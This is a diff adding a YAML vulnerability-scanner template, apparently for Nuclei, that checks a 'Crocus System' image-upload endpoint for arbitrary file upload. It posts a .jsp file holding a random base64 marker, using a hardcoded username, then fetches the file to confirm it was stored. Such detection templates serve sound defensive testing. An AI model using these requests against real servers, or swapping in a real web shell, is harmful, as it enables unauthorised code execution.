@@ -1,0 +1,60 @@
+id: poc-yaml-crocus-imageupload-anyfile-upload
+info:
+  name: Crocus System Imageupload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(7)}}"
+  t2: "{{base64(t1)}}"
+  t3: "{{base64(t2)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/RepairRecord.do?Action=imageupload'
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "username": "streamax20020818",
+        "license": "1",
+        "chnnel": 1,
+        "type": 1,
+        "imsage": "{{t3}}",
+        "picturename": "{{t1}}.jsp"
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"Result":true'
+        part: body
+      - type: word
+        words:
+          - "text/json"
+        part: header
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/SystemFile/PictureRecord/imageupload/{{t1}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t2}}'
+        part: body
